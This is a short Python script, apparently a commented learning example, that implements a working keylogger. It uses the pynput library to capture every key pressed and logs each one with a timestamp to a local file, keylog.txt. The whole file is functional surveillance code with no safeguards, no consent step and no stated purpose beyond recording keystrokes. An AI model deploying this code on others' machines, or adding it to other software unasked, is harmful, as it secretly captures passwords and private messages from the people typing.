
from pynput.keyboard import Key, Listener
import logging
#establishing the log file

log_dir = ""

#saves the log file in the same directory as the script
#creates the content as a txt file 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

#function that logs the key pressed
#content is saved as strings 
def on_press(key):
    logging.info(str(key))


#function that listens for the key pressed
# if the key is pressed, it will be logged 
with Listener(on_press =on_press) as listener:
    listener.join() 
